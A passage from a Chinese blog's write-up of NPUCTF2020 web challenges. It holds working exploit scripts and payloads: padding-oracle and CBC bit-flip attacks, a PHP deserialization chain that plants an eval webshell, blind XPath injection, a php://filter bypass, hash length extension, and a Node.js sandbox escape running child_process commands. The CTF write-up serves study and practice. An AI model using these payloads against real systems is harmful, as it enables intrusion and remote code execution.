</ol><p>index.php源码如下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);   <span class="comment"># $key,$flag</span></span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);  <span class="comment">//定义加密方式</span></span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, $key);    <span class="comment">//定义密钥</span></span><br><span class="line">define(<span class="string">"IV"</span>,<span class="string">"6666666666666666"</span>);    <span class="comment">//定义初始向量 16个6</span></span><br><span class="line">define(<span class="string">"BR"</span>,<span class="string">'&lt;br&gt;'</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>]))header(<span class="string">'location:./index.php?source=1'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#var_dump($GLOBALS);   //听说你想看这个？</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_encrypt</span><span class="params">($iv,$data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"--------encrypt---------"</span>.BR;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'IV:'</span>.$iv.BR;</span><br><span class="line">    <span class="keyword">return</span> base64_encode(openssl_encrypt($data, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)).BR;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_decrypt</span><span class="params">($iv,$data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> openssl_decrypt(base64_decode($data),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'False'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'method'</span>]==<span class="string">'encrypt'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $iv = IV;</span><br><span class="line">    $data = $flag;    </span><br><span class="line">    <span class="keyword">echo</span> aes_encrypt($iv,$data);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">'method'</span>]==<span class="string">"decrypt"</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $iv = @$_POST[<span class="string">'iv'</span>];</span><br><span class="line">    $data = @$_POST[<span class="string">'data'</span>];</span><br><span class="line">    <span class="keyword">echo</span> aes_decrypt($iv,$data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"我摊牌了，就是懒得写前端"</span>.BR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'source'</span>]==<span class="number">1</span>)highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a>





<p>从上面代码可知128位的cbc，blocksize是16字节，加密IV已知，secret未知，我们还知道解密是否成功，密文，我们又可以控制密文和解密的IV，可以使用padding oracle爆出明文。</p>
<p>具体的<a href="https://www.freebuf.com/articles/web/15504.html" target="_blank" rel="noopener">攻击理论</a></p>
<p><a href="https://glotozz.github.io/2020/04/20/NPUCTF-wp/#web" target="_blank" rel="noopener">glotozz</a>师傅的exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url = <span class="string">'http://ha1cyon-ctf.fun:30141/index.php?source&amp;method=decrypt'</span></span><br><span class="line">N = <span class="number">16</span></span><br><span class="line">l = [<span class="number">0</span>] * N</span><br><span class="line">iv = <span class="string">'6666666666666666'</span></span><br><span class="line">tmp_iv = <span class="string">''</span></span><br><span class="line">out = [<span class="number">0</span>] * N</span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, N+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">        l[N-i] = c</span><br><span class="line">        tmp_iv = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> l:</span><br><span class="line">            tmp_iv += chr(m)</span><br><span class="line">        <span class="keyword">print</span> base64.b64encode(tmp_iv)</span><br><span class="line">        <span class="comment"># print payload</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'iv'</span>: tmp_iv,</span><br><span class="line">            <span class="string">'data'</span>: <span class="string">'ly7auKVQCZWum/W/4osuPA=='</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        data = requests.post(url, data=data).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'False'</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">            out[N-i] = c ^ i</span><br><span class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> range(i):</span><br><span class="line">                l[N-y<span class="number">-1</span>] = out[N-y<span class="number">-1</span>] ^ (i+<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(N):</span><br><span class="line">    out[i] = out[i] ^ ord(iv[i])</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> out:</span><br><span class="line">    s += chr(c)</span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure>

<p>爆出明文 <code>FlagIsHere.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);    <span class="comment">//$fl4g</span></span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);</span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, <span class="string">"6666666"</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_iv</span><span class="params">()</span></span>&#123;    <span class="comment">//生成随机初始向量IV</span></span><br><span class="line">    $random_iv=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">16</span>;$i++)&#123;</span><br><span class="line">        $random_iv.=chr(rand(<span class="number">1</span>,<span class="number">255</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$lalala = <span class="string">'piapiapiapia'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'Identity'</span>]))&#123;</span><br><span class="line">    $_SESSION[<span class="string">'iv'</span>] = get_iv();</span><br><span class="line"></span><br><span class="line">    $_SESSION[<span class="string">'Identity'</span>] = base64_encode(openssl_encrypt($lalala, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $_SESSION[<span class="string">'iv'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> base64_encode($_SESSION[<span class="string">'iv'</span>]).<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'iv'</span>]))&#123;</span><br><span class="line">    $tmp_id = openssl_decrypt(base64_decode($_SESSION[<span class="string">'Identity'</span>]), METHOD, SECRET_KEY, OPENSSL_RAW_DATA, base64_decode($_POST[<span class="string">'iv'</span>]));</span><br><span class="line">    <span class="keyword">echo</span> $tmp_id.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>($tmp_id ===<span class="string">'weber'</span>)<span class="keyword">die</span>($fl4g);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>CBC字节反转攻击</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64 <span class="keyword">as</span> b64</span><br><span class="line"></span><br><span class="line">source_str = <span class="string">'piapiapiapia'</span> + <span class="number">4</span> * <span class="string">'\x04'</span></span><br><span class="line">target_srt = <span class="string">'weber'</span> + <span class="number">11</span> * <span class="string">'\x0b'</span></span><br><span class="line">token = <span class="string">'sS8OuVOl9tyCkzAzsabGBA=='</span>  <span class="comment"># 你获得的初始IV的base64encode值</span></span><br><span class="line">token = list(b64.b64decode(token))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(target_srt)):</span><br><span class="line">    token[x] = chr(ord(token[x]) ^ ord(target_srt[x]) ^ ord(source_str[x]))</span><br><span class="line"><span class="keyword">print</span> b64.b64encode(<span class="string">''</span>.join(token))</span><br></pre></td></tr></table></figure>

<p>得到网盘地址下载得到<code>HelloWorld.class</code>，<code>jd-gui</code>反编译得到byte流,后面python解一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(bytearray([<span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">54</span>, <span class="number">95</span>, <span class="number">52</span>, <span class="number">111</span>, <span class="number">103</span>, <span class="number">95</span>, <span class="number">49</span>, <span class="number">115</span>, <span class="number">95</span>, <span class="number">101</span>, <span class="number">52</span>, <span class="number">115</span>, <span class="number">121</span>, <span class="number">103</span>, <span class="number">48</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">125</span> ]))</span><br></pre></td></tr></table></figure>

<h3 id="2-ReadlezPHP"><a href="#2-ReadlezPHP" class="headerlink" title="2.ReadlezPHP"></a>2.ReadlezPHP</h3><p>看源码，跳转到<code>/time.php?source</code>得到源码</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">#error_reporting(0);</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $a;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $b;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;a = <span class="string">"Y-m-d h:i:s"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;b = <span class="string">"date"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        $a = <span class="keyword">$this</span>-&gt;a;</span></span><br><span class="line"><span class="php">        $b = <span class="keyword">$this</span>-&gt;b;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> $b($a);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$c = <span class="keyword">new</span> HelloPhp;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="number">0</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">@$ppp = unserialize($_GET[<span class="string">"data"</span>]);</span></span><br></pre></td></tr></table></figure>

<p>简单的反序列化，这里需要注意的是不能用 <code>eval</code> 因为eval是一个语言构造器而不是一个函数，不能被 <a href="http://php.net/manual/zh/functions.variable-functions.php" target="_blank" rel="noopener">可变函数</a> 调用。</p>
<p>PHP 支持可变函数的概念。这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途。</p>
<p>在PHP7中assert变成了一种语言结构而不是一个函数。也就是说像eval一样不支持可变函数。但某几个php7版本支持可变函数。</p>
<p>题目这个7.0.33版本正好可以.</p>
<p>构造反序列化payload，本地测试成功，但打过去命令没执行。怀疑是被禁用了系统函数，所以构造payload查看phpinfo();</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">&#125;</span><br><span class="line">$o = <span class="keyword">new</span> HelloPhp;</span><br><span class="line">$o-&gt;a = <span class="string">'phpinfo()'</span>;</span><br><span class="line">$o-&gt;b = <span class="string">"assert"</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($o));</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/NPUCTF2020-复现/image-20200527184236232.png" alt="image-20200527184236232"></p>
<p>这种情况一般是写个马上去，然后用其他方法bypass</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$o-&gt;a = <span class="string">'file_put_contents("1.php", "&lt;?php eval(\$_REQUEST[\'a\']); ?&gt;")'</span>;</span><br></pre></td></tr></table></figure>

<p>然后利用蚁剑插件直接绕过</p>
<p>最后在环境变量中找到了flag</p>
<p><img src="/2020/05/NPUCTF2020-复现/image-20200527191351755.png" alt="image-20200527191351755"></p>
<h3 id="3-ezlogin"><a href="#3-ezlogin" class="headerlink" title="3.ezlogin"></a>3.ezlogin</h3><p>弱口令，直接访问admin.php,都没啥发现，后面抓包看到是XML格式提交，考虑XXE或XPATH注入</p>
<p><img src="/2020/05/NPUCTF2020-复现/image-20200527192234895.png" alt="image-20200527192234895"></p>
<p>后面发现一个会话只有15秒，只能写脚本了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">session = requests.session()</span><br><span class="line">base_url = <span class="string">'http://d13a21db-47ab-4bae-a43f-86d733871552.node3.buuoj.cn/'</span></span><br><span class="line">payload = <span class="string">"' or substring(&#123;target&#125;,&#123;index&#125;,1)='&#123;char&#125;' or '"</span></span><br><span class="line"></span><br><span class="line">chars = string.ascii_letters+string.digits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_csrf</span><span class="params">()</span>:</span></span><br><span class="line">    res = session.get(base_url, headers=&#123;<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36'</span>,</span><br><span class="line">                                         <span class="string">'Cookie'</span>: <span class="string">'PHPSESSID=5d86406434bb835c822991118a6a8eee0'</span>&#125;).text</span><br><span class="line">    <span class="keyword">return</span> re.findall(<span class="string">'&lt;input.*value="(.*?)"./&gt;'</span>, res)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#注入payload</span></span><br><span class="line">target = <span class="string">'count(/*)=1'</span></span><br><span class="line"><span class="comment">#true</span></span><br><span class="line">target = <span class="string">'count(/*[1]/*)=1'</span></span><br><span class="line"><span class="comment">#true</span></span><br><span class="line">target=<span class="string">'count(/*[1]/*[1]/*)=1'</span></span><br><span class="line"><span class="comment">#false</span></span><br><span class="line">target=<span class="string">'count(/*[1]/*[1]/*)=2'</span></span><br><span class="line"><span class="comment">#true</span></span><br><span class="line">target=<span class="string">'count(/*[1]/*[1]/*[1]/*)=1'</span></span><br><span class="line"><span class="comment">#false</span></span><br><span class="line">target=<span class="string">'count(/*[1]/*[1]/*[1]/*)=2'</span></span><br><span class="line"><span class="comment">#false</span></span><br><span class="line">target=<span class="string">'count(/*[1]/*[1]/*[1]/*)=3'</span></span><br><span class="line"><span class="comment">#true</span></span><br><span class="line">target=<span class="string">'string(/*[1]/*[1]/*[1]/*[1])'</span></span><br><span class="line"><span class="comment">#1</span></span><br><span class="line">target=<span class="string">'string(/*[1]/*[1]/*[1]/*[2])'</span></span><br><span class="line"><span class="comment">#guest</span></span><br><span class="line">target=<span class="string">'string(/*[1]/*[1]/*[1]/*[3])'</span></span><br><span class="line"><span class="comment">#e10adc3949ba.......</span></span><br><span class="line">target=<span class="string">'string(/*[1]/*[1]/*[2]/*[2])'</span></span><br><span class="line"><span class="comment">#adm1n</span></span><br><span class="line">target=<span class="string">'string(/*[1]/*[1]/*[2]/*[3])'</span></span><br><span class="line"><span class="comment">#cf7414b5bdb2e65ee43083f4ddbc4d9f</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = <span class="string">'&lt;username&gt;&#123;username&#125;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;token&gt;&#123;token&#125;&lt;/token&gt;'</span></span><br><span class="line">headers = &#123;<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36'</span>,</span><br><span class="line">           <span class="string">'Content-Type'</span>: <span class="string">'application/xml'</span>,</span><br><span class="line">           <span class="string">'Cookie'</span>: <span class="string">'PHPSESSID=0f91e551561497454d0b8e91253ca104'</span>&#125;</span><br><span class="line">result=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">35</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> chars:</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        temp_payload = payload.format(target=target, index=str(i), char=j)</span><br><span class="line"></span><br><span class="line">        token = get_csrf()</span><br><span class="line"></span><br><span class="line">        temp_data = data.format(username=temp_payload, token=token)</span><br><span class="line">        res = session.post(url=base_url+<span class="string">'login.php'</span>,</span><br><span class="line">                           data=temp_data, headers=headers)</span><br><span class="line">        <span class="comment"># print(temp_data)</span></span><br><span class="line">        <span class="comment"># print(res.text)</span></span><br><span class="line">        <span class="comment"># print(len(res.text))</span></span><br><span class="line">        <span class="keyword">if</span> len(res.text) == <span class="number">5</span>:</span><br><span class="line">            result += j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>

<p>拿到密码md5解密得到密码 <code>gtfly123</code>，登陆后观察到url中<code>?file=welcome</code></p>
<p><img src="/2020/05/NPUCTF2020-复现/image-20200527205557544.png" alt="image-20200527205557544"></p>
<p>任意文件读取</p>
<p>但使用一般的php://filter发现其被过滤了，那么尝试后发现过滤了一下关键字：<code>php: .php read base</code></p>
<p>并且返回的内容中不能含有flag字符串，fuzz后发现其没有过滤大小写，那么用大写绕过协议，read可省略，编码方式使用rot13：pHp://filter/string.rot13/resource=/flag</p>
<h3 id="4-ezinclude"><a href="#4-ezinclude" class="headerlink" title="4.ezinclude"></a>4.ezinclude</h3><p>根据hint        md5($secret.$name)===$pass可以知道这题是个hash长度扩展攻击 但是，看到其他师傅有个非预期解</p>
<p><img src="/2020/05/NPUCTF2020-复现/image-20200527214601299.png" alt="image-20200527214601299"></p>
<p><img src="/2020/05/NPUCTF2020-复现/image-20200527214620796.png" alt="image-20200527214620796"></p>
<p>正常的解法是hash长度扩展攻击</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">    data=os.popen(<span class="string">'hashpump -s 6c24bc6e5b7444222bd69cfc90fa536c -d zz -k '</span>+str(i)+<span class="string">' -a zz'</span>).read()</span><br><span class="line">    name=data.split(<span class="string">'\n'</span>)[<span class="number">0</span>]</span><br><span class="line">    password=data.split(<span class="string">'\n'</span>)[<span class="number">1</span>].replace(<span class="string">'\\x'</span>,<span class="string">'%'</span>)</span><br><span class="line">    result=requests.get(<span class="string">'http://ec560480-bfa8-4fda-bb89-116987af030d.node3.buuoj.cn/index.php?name='</span>+password+<span class="string">'&amp;pass='</span>+name).text</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>

<p>直接访问会跳转404，所以用Burp发包。</p>
<p>是一个文件包含</p>
<p><img src="/2020/05/NPUCTF2020-复现/image-20200528220708064.png" alt="image-20200528220708064"></p>
<p>比较坑的地方是dir.php 要扫描。如果得到了dir.php，应该都会想到上传临时文件getshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">file_data=&#123;</span><br><span class="line">true<span class="string">'file'</span>: BytesIO(<span class="string">"&lt;?php eval($_POST['a']);"</span>)</span><br><span class="line">&#125;</span><br><span class="line">url=<span class="string">"http://usrl/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd"</span></span><br><span class="line">r=requests.post(url=url,files=file_data,allow_redirects=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>从dir.php获取临时文件名getshell</p>
<p>最后是在phpinfo()页面找到flag</p>
<p><img src="/2020/05/NPUCTF2020-复现/image-20200528223919475.png" alt="image-20200528223919475"></p>
<h3 id="5-验证🐎"><a href="#5-验证🐎" class="headerlink" title="5.验证🐎"></a>5.验证🐎</h3><p>关键源码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">saferEval</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (str.replace(<span class="regexp">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span class="string">''</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">eval</span>(str);</span><br><span class="line">&#125;</span><br><span class="line">app.post(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> result = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">const</span> results = req.session.results || [];</span><br><span class="line">  <span class="keyword">const</span> &#123; e, first, second &#125; = req.body;</span><br><span class="line">  <span class="keyword">if</span> (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[<span class="number">0</span>]) === md5(second+keys[<span class="number">0</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.body.e) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        result = saferEval(req.body.e) || <span class="string">'Wrong Wrong Wrong!!!'</span>;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(e);</span><br><span class="line">        result = <span class="string">'Wrong Wrong Wrong!!!'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      results.unshift(<span class="string">`<span class="subst">$&#123;req.body.e&#125;</span>=<span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    results.unshift(<span class="string">'Not verified!'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (results.length &gt; <span class="number">13</span>) &#123;</span><br><span class="line">    results.pop();</span><br><span class="line">  &#125;</span><br><span class="line">  req.session.results = results;</span><br><span class="line">  res.send(render(req.session.results));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>先考虑第一层，<br><code>first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0])</code>keys不可知，无法爆破，而且需要.length相等，但是本身不相等，注意，此处用的是===以使类型和值完全匹配<br>对其进行加盐md5，加盐中出现了问题，因为盐是字符串，与字符串相加会导致强制类型转化 而String和Array都正好有length属性，并且</p>
<p><img src="/2020/05/NPUCTF2020-复现/image-20200605101837835.png" alt="image-20200605101837835"></p>
<p>但是直接传urlencoded的表单是没法传数组的，而这里正好使用了JSON的中间件，所以只需要传JSON就好了</p>
<p>然后考虑绕过正则，必须以 <code>Math.</code>开头的字符串，符号只能出现<code>()+\-*&amp;|%^&lt;&gt;=,?:</code>，虽然可以 <code>Math.__proto__</code>但在这里无法直接利用。</p>
<p>但可以通过<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/Arrow_functions" target="_blank" rel="noopener">箭头函数</a>构造这种链</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function">(<span class="params"><span class="built_in">Math</span></span>)=&gt;</span>(<span class="built_in">Math</span>=<span class="built_in">Math</span>.__proto__,<span class="built_in">Math</span>=<span class="built_in">Math</span>.__proto__))(<span class="built_in">Math</span>)</span><br><span class="line"><span class="comment">// Math.__proto__.__proto__</span></span><br></pre></td></tr></table></figure>

<p>然后尝试调用eval或者Function，但是此处无法直接输入字符串，故使用String.fromCharCode(…）然后利用<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/constructor" target="_blank" rel="noopener">Object.prototype.constructor</a>从原型链上导出 <code>String</code> 和Function</p>
<p>payloay大致如下</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function">(<span class="params"><span class="built_in">Math</span></span>)=&gt;</span>(<span class="built_in">Math</span>=<span class="built_in">Math</span>.constructor,<span class="built_in">Math</span>.constructor(<span class="built_in">Math</span>.fromCharCode(...))))(<span class="built_in">Math</span>+<span class="number">1</span>)()</span><br></pre></td></tr></table></figure>

<p>分析一下</p>
<p>开头的Math是箭头函数。需要接受的参数。类似于function(Math)</p>
<p>(Math+1)是函数的参数，Math是个对象 与字符串1拼接后变成一个字符串</p>
<p>最外面的小括号。是JS的立即执行函数。定义函数后调用</p>
<p>中间一长串就是函数体了</p>
<p><img src="/2020/05/NPUCTF2020-复现/image-20200605113220410.png" alt="image-20200605113220410"></p>
<p>生成命令</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen</span><span class="params">(cmd)</span>:</span></span><br><span class="line">  s = <span class="string">f"return process.mainModule.require('child_process').execSync('<span class="subst">&#123;cmd&#125;</span>').toString()"</span></span><br><span class="line">  <span class="keyword">return</span> <span class="string">','</span>.join([str(ord(i)) <span class="keyword">for</span> i <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(gen(<span class="string">'cat /flag'</span>))</span><br></pre></td></tr></table></figure>

<p>完整exp：</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">&#123;"e":"(Math=&gt;(Math=Math.constructor,Math=Math.constructor(Math.fromCharCode(<span class="number">114,101,116,117</span>,<span class="number">114,110,32,112</span>,<span class="number">114,111,99,101</span>,<span class="number">115,115,46,109</span>,<span class="number">97,105,110,77</span>,<span class="number">111,100,117,108</span>,<span class="number">101,46,114,101</span>,<span class="number">113,117,105,114</span>,<span class="number">101,40,39,99</span>,<span class="number">104,105,108,100</span>,<span class="number">95,112,114,111</span>,<span class="number">99,101,115,115</span>,<span class="number">39,41,46,101</span>,<span class="number">120,101,99,83</span>,<span class="number">121,110,99,40</span>,<span class="number">39,99,97,116</span>,<span class="number">32,47,102,108</span>,<span class="number">97,103,39,41</span>,<span class="number">46,116,111,83</span>,<span class="number">116,114,105,110</span>,<span class="number">103,40,41</span>))()))(Math+<span class="number">1</span>)","first":"<span class="number">1</span>","second":[<span class="number">1</span>]&#125;</span><br></pre></td></tr></table></figure>

<p>不要忘了把修改把Content-Type 修改成<code>application/json</code></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>复现</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPOK6.0代码审计</title>
    <url>/2022/03/PHPOK6-0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
